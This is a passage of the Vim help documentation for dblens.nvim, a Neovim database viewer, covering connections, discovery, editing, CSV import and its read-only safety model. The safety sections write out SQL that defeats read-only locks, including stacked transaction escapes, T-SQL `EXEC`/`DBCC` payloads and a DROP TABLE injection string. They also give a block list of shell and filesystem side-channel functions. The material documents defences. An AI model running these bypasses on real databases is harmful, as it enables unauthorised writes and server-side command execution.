1. Introduction                                                 *dblens-intro*
                                                                      *dblens*

dblens.nvim is a database viewer for Neovim. It gives you a schema tree, a
paged result grid and a SQL scratch buffer in one tab page, and drives six
engines through the command-line clients you already have.

There is no compiled component and no server: every query is a one-shot client
process, decoded through a record protocol chosen so that a SQL NULL is never
confused with the text "NULL". Writes go through a single choke point that
enforces read-only connections, a confirmation preview, and a `count(*)` guard
proving a row-targeted edit matches exactly one row. See |dblens-safety|.

                                                             *dblens-engines*
Supported engines, and how strong a LOCKED connection is on each. The
difference is not cosmetic: on the "strong" engines the ENGINE refuses the
write, on SQL Server dblens's own classifier does. See |dblens-safety-mssql|.
>
    kind        client      LOCKED enforced by          strength    verified
    sqlite      sqlite3     file open mode + -safe      strong      3.53 live
    duckdb      duckdb      file open mode + -safe      strong      1.5.5 live
    postgres    psql        read-only transaction       strong      18.4 live
    mysql       mysql       read-only txn + session     strong      8.4 live
    mariadb     mariadb     read-only txn + session     strong      11.8 live
    mssql       sqlcmd      dblens's classifier         BEST-EFFORT 2022 live
                                                        (BETA)
<
The `mssql` row is not a weaker shade of the same promise. SQL Server has no
read-only transaction, so its lock is a verb blocklist dblens cannot prove
complete - connect as a read-only SQL login for a hard boundary. See
|dblens-safety-mssql|.

==============================================================================
2. Requirements                                          *dblens-requirements*

- Neovim 0.10 or newer.
- The command-line client for each database you want to reach:

    SQLite              `sqlite3` (3.34 or newer, for `-safe`)
    DuckDB              `duckdb`
    PostgreSQL          `psql`
    MySQL               `mysql`
    MariaDB             `mariadb`  (MariaDB's own client, not the symlink)
    SQL Server          `sqlcmd`   (mssql-tools18, or go-sqlcmd)

No compiled dependencies. A missing client only makes that one database kind
unavailable; `:checkhealth dblens` reports which clients were found, and which
engines enforce a locked connection themselves. See |dblens-health|.

==============================================================================
3. Installation                                               *dblens-install*

dblens works with no `setup()` call at all: the commands, the default mappings
and the default configuration are applied on load. Call `setup()` only to
change something.

lazy.nvim: >lua
    require('lazy').setup({
      { 'devGunnin/dblens.nvim' },
    })
<
packer: >lua
    use 'devGunnin/dblens.nvim'
<
There is no published tag yet, so both snippets install the default branch;
pin a commit if you want a fixed version.

Then `:DbLens` to open and `:DbLensAdd` to add your first connection.

4. Connections                                            *dblens-connections*

A connection is a table with a `name`, a `kind`, the fields that kind
requires, and optionally `read_only`.

Kinds and their required fields:

    `sqlite`      `path`        the database file
    `duckdb`      `path`        the database file
    `postgres`    `database`    optional: `host`, `port`, `user`, `sslmode`
    `mysql`       `database`    optional: `host`, `port`, `user`
    `mariadb`     `database`    optional: `host`, `port`, `user`
    `mssql`       `database`    optional: `host`, `port`, `user`,
                              `trust_server_certificate`

Accepted alias spellings: `sqlite3`, `duck`, `postgresql`, `pg`, `psql`,
`maria`, `sqlserver`, `sql-server`, `tsql`, `sqlcmd`.

`mariadb` used to be an alias for `mysql`. It is its own kind now, because
MariaDB ships the `mariadb` client rather than `mysql`; an existing
`kind = 'mariadb'` connection keeps working and now drives that binary. Set
`clients.mariadb = 'mysql'` if your machine only has the compatibility symlink.

For `sqlite` and `duckdb`, `create = true` allows opening a file that does not
exist yet; without it a missing file is an error rather than a silently
created empty database. Creating one WRITES, so the connection must also set
`read_only = false`: every connection is locked by default, locked opens the
file with `-readonly`, and dblens refuses the combination by name rather than
letting the client fail with "unable to open database file".

`trust_server_certificate` is for `mssql` only: ODBC Driver 18 encrypts by
default and verifies the certificate, which a development server's self-signed
one fails. Set it only when you know the server is the one you meant.

Connections come from two places: `connections` in `setup()` (owned by your
config, not editable from the UI) and the connections file written by
|:DbLensAdd|. A duplicate name across the two is an error, so `:DbLens name`
can never open a different database than the name suggests.

IN SETUP()                                          *dblens-connections-setup*
>lua
    require('dblens').setup({
      connections = {
        { name = 'app', kind = 'sqlite', path = '~/src/app/db.sqlite3' },

        {
          name = 'prod',
          kind = 'postgres',
          host = 'db.internal',
          port = 5432,
          user = 'analyst',
          database = 'shop',
          password_env = 'PGPASSWORD_PROD',
          read_only = true,
        },

        {
          name = 'reporting',
          kind = 'mysql',
          host = '127.0.0.1',
          port = 3306,
          user = 'report',
          database = 'metrics',
          password_cmd = { 'pass', 'show', 'db/reporting' },
        },
      },
    })
<
INTERACTIVELY                                        *dblens-connections-form*

|:DbLensAdd| asks for the kind, a name, the adapter's fields, where the
password comes from (none, an environment variable, or a command) and whether
the connection is read-only, then saves it to the connections file.
|:DbLensRemove| deletes it again. A connection declared in `setup()` cannot be
removed there; remove it from your config.

PASSWORDS                                         *dblens-connections-secrets*

dblens refuses to store a plaintext password. A spec carrying a `password`,
`pass` or `pwd` key fails validation with an error naming the connection. A
spec carries a reference instead:

    `password_env`    name of an environment variable holding the password
    `password_cmd`    argv whose first line of stdout is the password

The value is resolved into memory when the connection opens, handed to the
client through PGPASSWORD or MYSQL_PWD (never argv, which would expose it in
the process list), and dropped when the session closes. It is never written
back, logged or persisted. If a `password_cmd` fails, dblens reports the
failure but never the command's output, because that output is the secret.

Omitting both is correct for SQLite and for ambient authentication (.pgpass,
peer, socket).

The connections file is written with `rw-------` permissions. `:checkhealth`
reports whether a connection has a password reference, never which variable
and never its value.

DISCOVERY                                                   *dblens-discovery*

|:DbLensDiscover| looks through the project you are in and offers the
databases it appears to have. Opening dblens with no connection configured
does the same instead of telling you to add one.

The workspace is the git repository the working directory is in, or the
working directory itself. Three things are read there:

  DATABASE FILES  `*.db` `*.sqlite` `*.sqlite3` `*.sqlite2` `*.duckdb` `*.ddb`,
                  by a bounded walk of the project - INCLUDING gitignored
                  ones, which is what a development database usually is. The
                  file's magic header decides between SQLite and DuckDB; an
                  ambiguous `.db` with no header is treated as SQLite.

  COMPOSE FILES   `docker-compose*.yml` and `compose*.yml`: services whose
                  image is postgres, mysql, mariadb or mssql, with the host
                  port they publish and the user, database and password from
                  their `environment`. `${VAR}` is resolved from the `.env`
                  beside the compose file. A service that publishes no host
                  port is not offered - nothing could connect to it.

  ENV FILES       `.env` and `.env.*`: every value that parses as a connection
                  URL (`postgres://`, `postgresql://`, `mysql://`, `mariadb://`,
                  `sqlite:///...`, `duckdb://...`, a driver-suffixed
                  `postgresql+psycopg://` and its family, and
                  `jdbc:postgresql://`), plus any variable group that names a
                  database. `.env.example` and friends are skipped: they hold
                  placeholders.

                                              *dblens-discovery-env-groups*
A variable group is read under whatever prefix the project puts on it:
`TACTICA_POSTGRES_DB`, `TACTICA_POSTGRES_USER` and `TACTICA_POSTGRES_PASSWORD`
are one connection, and a standalone `TACTICA_DB_PORT` is the port it answers
on here - the usual shape, because the group describes the container and only
that variable says what the port is published as. The bare `PG*` and `MYSQL_*`
names are the same rule with no prefix. An absent host is `localhost` and an
absent port the engine's default; neither is guessed at from anything else, a
group that names no database is not a connection, and an engine no variable
names is not invented. Several prefixes in one file are several connections.

A URL naming a compose service (`postgresql+psycopg://u:p@db:5432/app`) points
at a host only a sibling container can reach. It is still offered - only you
know whether the stack is up - but when the same file publishes a port for it,
the reachable `localhost` connection is offered beside it.

Every candidate shows where it came from, so a real database can be told from
a guess: >
    db/dev.sqlite3     (sqlite, file)
    app-db             (postgres, localhost:5433/shopdb, from compose.yml)
    DATABASE_URL       (postgres, localhost:5432/appdb, from .env)
    tactica            (postgres, localhost:5433/tactica, from .env)
    Add manually...    the :DbLensAdd form
    Rescan             look through the project again
<
The scan is bounded and asynchronous: at most `discovery.max_depth` levels
deep and `discovery.max_entries` directory entries, skipping `.git`,
`node_modules`, `vendor`, `target`, `dist`, `build`, `.venv`, `__pycache__` and
the other heavy directories, a few directories per tick so the editor stays
responsive, and cancellable with the usual cancel key. It never follows a
symlink, so it cannot read anything outside the project -- and a database file
that a `.env` NAMES outside the project (`sqlite:///../elsewhere.db`) is
dropped rather than offered, so the same boundary holds however the path was
written.

WHAT DISCOVERY DOES NOT DO                          *dblens-discovery-safety*

It never connects on its own. Nothing is scanned until dblens is opened or
|:DbLensDiscover| is run, nothing is connected until a candidate is picked,
and `setup()` starts nothing. With exactly one candidate the picker starts on
it; it still has to be confirmed.

A discovered connection opens LOCKED, like every other connection: the
database itself refuses writes until |:DbLensWrite|. See |dblens-safety|.

It executes nothing it finds. A `docker-compose.yml` is parsed, never run; a
`.env` is read, never sourced.

What a workspace file says is untrusted. A candidate is validated before it is
offered, and a value a database client would read as an OPTION rather than as
data (a host, user, database or path starting with `-`) is refused, so a cloned
repository cannot steer the client dblens spawns. Anything dropped is reported
alongside what was found.

A discovered password is never written anywhere. A password parsed out of a
`DATABASE_URL` or a compose file is held in memory for that editor session
only, and a discovered connection is SESSION-ONLY: it is never added to the
connections file, so that file cannot receive a secret discovery read. To keep
one, add it with |:DbLensAdd|, which asks where its password comes from
(`password_env` / `password_cmd`) rather than storing one.

Set `discovery.auto = false` to stop the offer on open; |:DbLensDiscover| still
works.

5. Usage                                                        *dblens-usage*

`:DbLens` opens a dedicated tab page with three panes: the schema tree on the
left, the result grid top right, the SQL scratch buffer below it. With exactly
one connection configured, dblens connects to it; with several, it asks.

BROWSING                                               *dblens-usage-browsing*

The tree runs connection > schema > table or view > columns, indexes and
constraints, with primary key, foreign key, NOT NULL and type shown per
column. SQLite has no schema level, so the tree skips it.

`<CR>` expands a node, or opens a table in the grid. `o` opens a table
directly, `c` counts its rows, `D` shows its DDL, `X` exports it to a file,
`R` reloads the schema.

The grid pages through the table `page_size` rows at a time (`]p` and `[p`,
`[P` and `]P` for the first and last page, `gp` to jump to one). The last page
needs the row count, which is why it says so when the count has not arrived.

`s` sorts by the column under the cursor, cycling ascending, descending, then
unsorted, and replaces whatever the rows were sorted by before. `S` ADDS the
column under the cursor as the next sort key instead, cycling that one key the
same way and dropping it on the third press; `gs` clears every key at once. The
header marks each key with an arrow, and with its position when there is more
than one. `f` applies a WHERE predicate. All of it is done by the server, and
every change resets to the first page. Sorting and filtering need a table: for
a query result, put ORDER BY or WHERE in the query itself.

`F` filters to the value under the cursor and `!` filters it out, without
retyping it: dblens builds the predicate itself, quoted for the dialect, so a
value holding a quote, a `;` or a `--` is data and not syntax. A NULL cell
gives `IS NULL` / `IS NOT NULL`. `C` clears the filter again.

                                                     *dblens-usage-follow-fk*
`gf` on a cell whose column has a foreign key opens the referenced table,
filtered to the referenced row; the winbar shows where you came from. A NULL
cell references nothing and says so, and a column with several references asks
which one. It is a read throughout - the target comes from metadata already
loaded and the row is browsed by the same paged SELECT as any other table.

                                                  *dblens-usage-referencing*
`gF` goes the other way: the rows in OTHER tables whose foreign key points at
the row under the cursor. It is the same metadata inverted, so it needs the
columns of the other tables - the ones the tree never expanded are read first,
which is what makes "no loaded table references this" mean it. Several
referencing tables ask which one; a composite key matches on its own column
and says so; a NULL key, or a table with no single-column primary key to
assume, is reported rather than guessed at.

Also a read: the key value reaches the WHERE through the same per-dialect
quoting as `F`, never spliced into text.

                                                         *dblens-usage-tabs*
Several results can be open at once. `t` in the tree opens a table in a new
result tab and `<localleader>t` in the editor runs a statement into one; `gt`
and `gT` step between them, `gc` closes the one on screen and `gl` lists them.
The winbar names every open result once there is more than one.

A tab owns its whole view - result, filter, sort, search and page - and its
own race guard. A query started in one tab lands in THAT tab whatever you are
looking at when it finishes, and closing a tab stops what it was running.
`ui.results.max_tabs` caps how many can be open, because each one holds a
whole result set. Closing the last tab empties it rather than closing dblens.

                                                       *dblens-usage-search*
`g/` searches the loaded result and highlights every matching cell, `gn` and
`gN` step through the matches. Matching is over the underlying values, so a
hit inside a value the grid clipped at `ui.grid.max_col_width` is still found -
which the buffer's own `/` cannot do, because it only sees the drawn text.
`<CR>` on a match opens the row detail, which shows the value in full.

QUERYING                                                    *dblens-usage-sql*

In the scratch buffer `<CR>` runs the statement under the cursor, `<CR>` in
visual mode runs the selection, and `<localleader>r` runs the whole buffer.
Multiple statements run in order and stop at the first error; the last result
that has columns is what the grid shows. `<localleader>e` runs EXPLAIN and
`<localleader>E` runs EXPLAIN ANALYZE where the server has it. `<C-c>` cancels
whatever is running.

Executed statements are recorded in the history (`<leader>dh`), and
`<localleader>s` saves the current statement as a named snippet
(`<leader>ds`). Both persist to `history_file`. In either picker `<CR>` puts
the statement in the editor and `<C-r>` (or `<C-CR>`, where the terminal sends
it) runs it immediately - through the same path as one you typed, so a stored
write on a LOCKED connection is refused and a destructive one still confirms.

Completion is available while you type; see |dblens-completion|.

                                                       *dblens-usage-format*
`<localleader>f` formats the buffer, and the same key in visual mode formats
the selected LINES; `:DbLensFormat` does either, with a range or without.

dblens does not format SQL itself. It hands the text to a formatter you
already have - `sqlfluff`, `pg_format` or `sqlformat`, tried in that order, or
whatever `format.command` names - spawned as an argv ARRAY with the SQL on its
STDIN. There is no shell, no connection and no client: the formatter cannot
execute the statement, only reprint it. What comes back on stdout replaces the
lines, and only on success - a formatter that fails, times out or prints
nothing leaves the buffer exactly as it was and says why. With none installed
it names the ones to install rather than doing anything clever.

EDITING                                                    *dblens-usage-edit*

With a table open in the grid, `e` edits the cell under the cursor, `i`
inserts a row by editing the generated INSERT statement, and `dd` deletes the
row. Each shows the exact SQL before it runs. Type the value of
`ui.grid.null_display` (default "NULL") in a cell edit to set the cell to SQL
NULL. What can and cannot be applied is described in |dblens-safety|.

`y` yanks the cell, `Y` the row as CSV, `gy` the row as JSON, `gi` the row as
an INSERT statement.

                                                       *dblens-usage-export*
`X` exports. In the grid it writes the WHOLE result - a browsed table is
re-read with its filter and sort applied, not just the page on screen - and in
the tree it writes a whole table, unfiltered. The format comes from the
extension: `.csv`, `.json` or `.sql` (INSERT statements, so it needs a table
rather than a query result). An extension naming none of those is an error,
never a silent CSV.

A table is read by ONE statement in ONE client invocation, so the file is a
SNAPSHOT of it: a write that commits while the export is running belongs to
the next export, never to part of this one. Rows are written as the client
emits them, so a large export never has to fit in memory, and the file is
renamed into place only once the run has finished - a cancelled (`<C-c>`) or
failed export leaves whatever was there before untouched. An existing file is
confirmed before it is replaced. A sort is completed by the primary key, so
two rows that sort equal come out in the same order every time.

An export STOPS at `export.max_rows` (default 1,000,000), which is the LIMIT
of that one statement, and says so in the notification and in a trailing
comment where the format has one. CSV and JSON have nowhere to put it, so a
capped one of those gets a `<name>.INCOMPLETE` file beside it - the
notification is transient and the file is not. A short file is never reported
as a complete one. Where a query result cannot be re-read
safely - several statements, or one that writes - the rows already fetched are
written and the shortfall is stated the same way.

An empty string is written QUOTED (`""`) and SQL NULL is written empty, which
is the only thing that tells the two apart in CSV and what the import below
reads back. sqlite3, psql and `COPY ... CSV` write them the same way.

                                                       *dblens-usage-import*
`I` in the tree imports a CSV file into that table; `:DbLensImport` does the
same for the table in the grid, or one picked from the list. This is the only
place data from OUTSIDE the database is written into it, so it is the most
guarded thing dblens does:

  * EDIT MODE ONLY. A LOCKED connection is refused before a file is even
    asked for, and the session gate refuses every statement again anyway.
  * The path substitutes `~` and `$VAR` textually and evaluates nothing - no
    shell sees it - and the file is parsed by dblens itself, to RFC 4180:
    quoted fields, embedded commas, newlines and doubled quotes. A malformed
    file is an error naming the line, and nothing runs.
  * CSV columns are matched to table columns by HEADER NAME (case-insensitively
    where that is unambiguous). A header naming a column the table does not
    have is refused, never dropped or guessed at; columns the file does not
    mention keep their default, and the preview says which those are.
  * Every value becomes a QUOTED LITERAL. A cell holding `'); DROP TABLE x;--`
    is imported as that string - it is data, not syntax.
  * The row count, the mapping and a sample of the generated INSERTs are shown
    and must be confirmed before anything runs.
  * The run is ONE transaction (the deferred batch |dblens-transactions| uses).
    If any row fails, NOTHING is imported and the message names the row. There
    is no partial import.

`import.max_rows` caps the rows one import may insert and `import.max_bytes`
the size of the file that will be read; both refuse rather than importing part
of a file. An import cannot start while other changes are queued - commit or
roll those back first, so the two are never tied together.

6. Mappings                                                  *dblens-mappings*

Every binding is declared once and can be remapped or disabled per scope
through `keymaps` in `setup()`; see |dblens-config-keymaps|. `?` shows the
live list in the tree and the grid; the SQL editor uses `<localleader>?` so
that its backwards search keeps working. The overlay is generated from the
same table, so it can never name a key that is not bound.

With which-key installed, the `<leader>d` prefix is labelled `dblens`
automatically. Nothing is required, and nothing happens without it.

7. Commands                                                  *dblens-commands*

                                                                     *:DbLens*
:DbLens [{name}]        Open dblens, optionally on the named connection.
                        Completes connection names.

9. Safety                                                      *dblens-safety*

Read-only is enforced by the DATABASE ENGINE on five of the six engines, and
by dblens's own classifier on SQL Server, where it is BEST-EFFORT (BETA) - see
|dblens-safety-mssql|, and do not assume the guarantees below apply there.
On SQL Server, connect as a read-only SQL login for a hard boundary.
Everything else - the
confirmation prompt and the refusal of client meta-commands - is enforced at
one choke point, `Session:gate`, which every statement dblens sends passes
through before a client process exists.

WHAT LOCKED GUARANTEES                              *dblens-safety-guarantee*

Read this before pointing dblens at a database you care about. LOCKED is the
default for every connection.

On SQLite, DuckDB, PostgreSQL, MySQL and MariaDB, LOCKED DOES guarantee: >
    no accidental write - nothing you did not mean to run reaches the database
    no write through any ORDINARY SQL statement, however it is spelled. The
      DATABASE ENGINE refuses it - a read-only transaction on PostgreSQL,
      MySQL and MariaDB, the file handle's open mode on SQLite and DuckDB -
      not dblens reading your SQL
    no second statement. Every framing trick that stacked one (a `;` inside a
      comment, a bare \r, a nested block comment, a Unicode line separator) is
      refused unparsed, by a byte scan. That scan looks for `;`, so it does
      not carry to T-SQL, which needs no separator at all
<
`:checkhealth dblens` reports the strength per engine, and per connection.
LOCKED DOES NOT guarantee protection from someone who both HOLDS WRITE
CREDENTIALS and deliberately calls a write-capable extension: >
    SELECT dblink_exec('dbname=app ...', 'INSERT ...')
<
That INSERT runs in a SECOND PostgreSQL backend, outside dblens's read-only
transaction, and the whole thing is a single statement beginning with SELECT -
so neither the transaction nor the one-statement rule reaches it.
`postgres_fdw`, `lo_export`, `pg_read_file` and a MySQL shell UDF are the same
shape. dblens refuses the known names (|dblens-safety-side-channel|), and that
is BEST-EFFORT, EXPLICITLY NOT A BOUNDARY: a SECURITY DEFINER wrapper walks
straight through it.

If your threat model is a deliberate user rather than a slip of the keyboard,
connect as a database read-only role - |dblens-safety-role|. That is the only
hard boundary, and the server is the one enforcing it.

Compared honestly: this is what a client-side read-only mode can be. dblens's
is stronger than parsing your SQL and hoping, because the server refuses the
write - but no client can constrain what a function does once it is running
inside the server.

READ-ONLY CONNECTIONS                                *dblens-safety-read-only*

Every connection is LOCKED unless it says `read_only = false` (or
`safety.read_only_default` is false). While locked, dblens sends every run
inside a SERVER-SIDE READ-ONLY TRANSACTION, and opens the connection read-only
as well, so the engine itself refuses every write however the statement is
spelled: >
    SQLite      sqlite3 -readonly -safe  (no wrap: it is the file open mode)
                -> "attempt to write a readonly database"
    DuckDB      duckdb -readonly -safe   (no wrap: it is the file open mode)
                -> "Cannot execute statement of type ... in read-only mode"
                -safe is NOT decoration: under -readonly alone,
                COPY (SELECT 1) TO '/tmp/x.csv' still WROTE the file.
                Read-only covers the database; -safe covers the filesystem
    PostgreSQL  BEGIN READ ONLY; DECLARE ... CURSOR ...; <run>; COMMIT;
                plus PGOPTIONS=-c default_transaction_read_only=on
                -> "cannot execute ... in a read-only transaction"
    MySQL       START TRANSACTION READ ONLY; <run>; COMMIT;
    MariaDB     plus --init-command=SET SESSION TRANSACTION READ ONLY
                -> ERROR 1792 "Cannot execute statement in a READ ONLY
                   transaction"
    SQL Server  no such switch exists. LOCKED is best-effort (beta) here;
                connect as a read-only SQL login for a boundary the server
                enforces - see |dblens-safety-mssql|
<
On MySQL and MariaDB BOTH the transaction and the session switch are
load-bearing. Inside a bare `START TRANSACTION READ ONLY`, `CREATE TABLE` and
`DROP TABLE` SUCCEED - verified live on MySQL 8.4 and MariaDB 11.8, because
DDL commits the transaction implicitly and then runs outside it. The SESSION
switch is what refuses those. The transaction is what a SET in the same run
cannot undo: both `SET default_transaction_read_only = off; INSERT ...` and
`SET SESSION TRANSACTION READ WRITE; INSERT ...` used to land a row, and
inside an open read-only transaction they cannot, because a SET retargets only
LATER transactions. PostgreSQL additionally lets `SET TRANSACTION READ WRITE`
escalate a read-only transaction until it has taken a snapshot, which is what
the `DECLARE ... CURSOR` is for - it takes one and returns nothing.
This is the guarantee because the alternative is not one. dblens used to
decide read-only by lexing the SQL itself, and four independent reviews broke
it: nested block comments (`/* /* */` closes the comment everywhere except
PostgreSQL), MySQL's executable `/*!...*/` comments, backslash escaping, which
depends on the server's sql_mode rather than on the dialect, and a bare \r,
which ends a `--` comment for psql. A Lua reimplementation of five dialects'
lexers will always disagree with the real parser somewhere, and every
disagreement is a bypass.

Reads are unaffected: SELECT, EXPLAIN, catalog queries and paging all work
normally on a locked connection.

UNLOCKING is a deliberate act and the only way to write. |:DbLensWrite|
(`<leader>dw`) puts the active connection in EDIT mode: the next run spawns
without the read-only switch and without the wrap, so the ordinary write paths
work - still behind the confirmation gate. |:DbLensLock| puts it back and the
very next run is refused by the server again. The sidebar, the results winbar
and |dblens.statusline()| say LOCKED or EDIT.

ONE STATEMENT AT A TIME                             *dblens-safety-one-stmt*

What the server still cannot stop on PostgreSQL, MySQL and MariaDB: a
statement that ENDS or REPLACES the read-only transaction and writes in a new
one - >
    ROLLBACK; SET default_transaction_read_only = off; BEGIN; INSERT ...
    START TRANSACTION READ WRITE; INSERT ...
<
Every escape of that shape needs a SECOND top-level statement. So a LOCKED
connection refuses any input it cannot prove is exactly one statement: >
    a `;` anywhere but as the final character
    any control byte except tab and newline (\r \v \f NUL 0x1C-0x1F ...)
    a Unicode line separator (U+0085, U+2028, U+2029)
<
That is a byte scan, not a parse. The defence before it was the classifier's
statement count, and a bare \r - which psql reads as the end of a `--` comment
and the classifier did not - hid a stacked DROP TABLE from it and dropped the
table on a locked connection. Teaching the lexer about \r would only move the
gap. The two layers are the model: the read-only transaction makes ONE
statement unescapable, and this rule makes a SECOND statement unreachable.

The refusal names the mode and the way out. Multi-statement scripts are an
EDIT-mode feature: unlock with |:DbLensWrite|, and the confirmation gate still
applies. Ordinary reads are unaffected - multi-line SQL, comments, tabs and a
trailing `;` all pass. The deliberate cost: while locked, a statement carrying
a `;` inside a string literal or a quoted identifier (`SELECT ';'`) is refused
too, because proving that one is a single statement would mean trusting the
lexer again.

This rule is a scan for `;`, so IT DOES NOT CARRY TO T-SQL. SQL Server ends a
statement at whitespace: `SELECT 1 DROP TABLE t` is two statements with no `;`
in it, verified live - the table was dropped. See |dblens-safety-mssql|.

SQL SERVER: A WEAKER LOCK                                *dblens-safety-mssql*

`mssql` LOCKED MODE IS BEST-EFFORT, AND BETA. dblens does not claim it blocks
every write on SQL Server, and will not claim it later: the lock is a
BLOCKLIST of verbs over a language dblens does not parse, so an administrative
or DBCC statement it has not been taught about is a write rather than a
refusal. For a hard read-only boundary on SQL Server, connect as a READ-ONLY
SQL LOGIN (recipe at the end of this section) - the server enforces that one,
the way it does on the other five engines.

A LOCKED `mssql` connection is enforced by DBLENS, NOT BY SQL SERVER. SQL
Server offers no way to ask the engine for it: >
    there is no read-only transaction - BEGIN TRANSACTION has no READ ONLY
    there is no read-only connection mode. `sqlcmd -K ReadOnly` sets
      ApplicationIntent, which only routes to a readable secondary in an
      availability group. dblens passes it because it is the truthful thing
      to declare, NOT because it enforces anything: verified live on SQL
      Server 2022 that an INSERT sent under it lands
<
So LOCKED here is four client-side refusals, and a bug in any of them is a
write rather than a prompt: >
    1. the classifier - anything dblens cannot prove is a read is refused.
       On every other engine this layer is best-effort; here it IS the boundary
    2. the T-SQL juxtaposition rule - a write verb anywhere but the head of
       the statement is treated as opening a new one, because T-SQL needs no
       separator. INCLUDING ONE FOLLOWED BY `(`: `EXEC('...')` is T-SQL's
       dynamic-SQL STATEMENT, not a call, and exempting it as a call let
       `SELECT 1 EXEC('COMMIT TRANSACTION DROP TABLE t')` run as a READ on a
       locked connection - verified live on 2022, INSERT/TRUNCATE/DROP/CREATE
       DATABASE and a server-level CREATE LOGIN all landed. Cost, on this
       engine only: `SELECT REPLACE(a,'x','y')` is refused while locked, as is
       an UNQUOTED column named after a non-reserved write verb; quote it
    3. `GO` and the `:` commands - `GO` runs what follows as its OWN batch, a
       second statement no framing rule sees (verified live), and `sqlcmd -X1`
       does not stop it. Refused in LOCKED and EDIT alike: none of them is SQL
    4. the side-channel name check reads INSIDE string literals here, because
       `EXEC('...')` can turn a string into code. A locked read whose literal
       names xp_cmdshell, OPENROWSET or dblink is refused for that reason
<
WHAT NONE OF THAT COVERS: anything the classifier does not recognise as a
write. It is a lexer, not SQL Server's parser, and there is no second layer.

Not hypothetical. `SELECT 1 DBCC TRACEON(3999,-1)` classified as a READ, ran
clean on a LOCKED connection and flipped a global trace flag 0 -> 1, server
wide, still set on a brand-new connection. It survived the wrap below because
DBCC is not transactional, so the trailing ROLLBACK had nothing to undo. DBCC
FREEPROCCACHE and DBCC DROPCLEANBUFFERS landed the same way; BACKUP, RESTORE,
DENY and CHECKPOINT reached the server and were saved only by the wrap.

dblens now refuses the administrative verbs it knows - DBCC, BACKUP, RESTORE,
DENY, CHECKPOINT, RECONFIGURE, KILL, SHUTDOWN, WRITETEXT, UPDATETEXT, DISABLE,
ENABLE, RECEIVE - on top of the ordinary write verbs, and every payload above
is refused at the gate (re-verified live on 2022: the trace flag stays 0).
READ THAT AS DEFENCE IN DEPTH, NOT AS A COMPLETENESS CLAIM. T-SQL has more
state-changing verbs than dblens knows, and the next untaught one behaves
exactly as DBCC did. That is why `mssql` is best-effort and stays best-effort.

Underneath those, a locked run is wrapped in `SET XACT_ABORT ON; BEGIN
TRANSACTION; <run>; IF @@TRANCOUNT > 0 ROLLBACK TRANSACTION;`. That is a NET,
NOT A GUARANTEE, and its limit was measured: >
    a write past the classifier is undone - INSERT and DROP TABLE inside the
      wrap both left the database unchanged (SQL Server DDL is transactional)
    a `GO` alone does not escape it - the transaction survives the batch
      boundary, so the trailing ROLLBACK still reaches the write
    but anything that COMMITS THE WRAP AWAY escapes it and what follows runs
      in autocommit: `... GO ... INSERT ... COMMIT TRANSACTION`, and
      `EXEC('COMMIT TRANSACTION INSERT ...')` with no GO at all. The
      classifier refuses both; the wrap alone never stopped them
<
The wrap therefore ends by checking the transaction is still open and fails the
batch when it is not, so a run that committed its own net away is reported as
an error. Where the net simply holds, sqlcmd exits 0 and dblens reports success
for a write that was rolled back: the safe failure, not a correct one.

CONNECT AS A READ-ONLY SQL LOGIN. That is the boundary SQL Server does have,
the only one, and on this engine it is the RECOMMENDED way to run dblens
rather than a hardening extra - the server refuses the write, so no classifier
gap (the DBCC one above included) can produce one: >
    CREATE LOGIN dblens_ro WITH PASSWORD = '...';
    CREATE USER dblens_ro FOR LOGIN dblens_ro;

    -- either the role, covering every table and view in the database:
    ALTER ROLE db_datareader ADD MEMBER dblens_ro;
    -- or, narrower, just what this user should see:
    GRANT SELECT ON SCHEMA::dbo TO dblens_ro;

    DENY EXECUTE TO dblens_ro;
<
Point the connection at that login and keep `read_only = true`: the login
makes the write impossible, and dblens's own lock stays on as the layer that
catches the keystroke before it is sent.

Two more `mssql` facts worth knowing before you trust a cell: >
    NULL IS AMBIGUOUS. sqlcmd prints SQL NULL as the four characters NULL and
      has no null-marker option, so a real NULL and the string 'NULL' arrive
      as the same bytes. Every other engine dblens drives distinguishes them
    CONTROL CHARACTERS IN VALUES ARE FLATTENED, by `sqlcmd -k1`. Without it a
      value holding a newline split the record and one holding 0x1F split the
      row. A flattened cell beats a corrupted grid
    NO EXPLAIN. A SQL Server plan needs SET SHOWPLAN_ALL ON as its own batch,
      and dblens sends one statement per invocation
<
SIDE CHANNELS                                     *dblens-safety-side-channel*

Some functions do their work OUTSIDE the transaction dblens opened - in a
second database backend, or on the server's filesystem. A read-only
transaction governs neither. Each is one statement led by SELECT, so every
layer above passes it. A LOCKED connection refuses these names: >
    dblink...          the whole family, by prefix
    postgres_fdw...    a second database session dblens cannot make read-only
    lo_import lo_export pg_read_file pg_read_binary_file pg_ls_dir
    pg_stat_file       the PostgreSQL server's filesystem
    LOAD_FILE          the MySQL / MariaDB server's filesystem
    sys_exec sys_eval  a shell on the MySQL / MariaDB server, via a UDF
    xp_cmdshell sp_execute_external_script sp_OACreate sp_OAMethod
                       a command on the SQL Server host
    OPENROWSET OPENDATASOURCE OPENQUERY BULK xp_dirtree xp_subdirs
    xp_fileexist xp_fixeddrives xp_regread
                       another data source, or the SQL Server host's files
<
The SQL Server names matter more than the rest: on every other engine there is
a read-only transaction behind this list, and on SQL Server there is not.
DuckDB is absent for the same reason SQLite is - a locked DuckDB connection
runs `-safe`, so the ENGINE refuses every filesystem reach (COPY ... TO,
read_csv, INSTALL), and a name list would duplicate that.

The refusal names the function it objected to; unlock to run it. This is
measurable, not decorative. Verified live on PostgreSQL 16: inside dblens's
read-only wrap `lo_export` WROTE a file on the server, `pg_read_file` READ
one, and `dblink_exec` landed a row. All three are now refused.

AND IT IS A NAME CHECK, so treat it as raising the bar, never as a boundary.
A SECURITY DEFINER wrapper, a rename, or a copy in another schema is not
caught. Verified live: `SELECT refresh_cache('...')`, a one-line wrapper
around the same `dblink_exec`, still landed its row on a LOCKED connection.
No client-side check can close that - a function's NAME says nothing about
what the function DOES. `tests/spec/side_channel_spec.lua` pins that
limitation as a test case rather than pretending it away.

Quoting decides: a quoted identifier or a string literal holding one of these
names is data, so `SELECT "dblink_log" FROM audit` is an ordinary read. EDIT
mode never applies the check - an unlocked connection can write with a plain
INSERT, so refusing there would only break a legitimate dblink query.

Already covered by the layers above: `COPY ... TO/FROM PROGRAM` (COPY is a
write verb), `SELECT ... INTO OUTFILE`/`DUMPFILE` and `LOAD DATA INFILE`
(refused as writes). SQLite needs no name list - `-safe` refuses
`writefile()`, `.load` and ATTACH at the client, and `-readonly` is the file
handle's open mode.

A DATABASE READ-ONLY ROLE                                 *dblens-safety-role*

The only guarantee that holds against a user who HAS write credentials is not
to give the connection write credentials. dblens uses whatever role you point
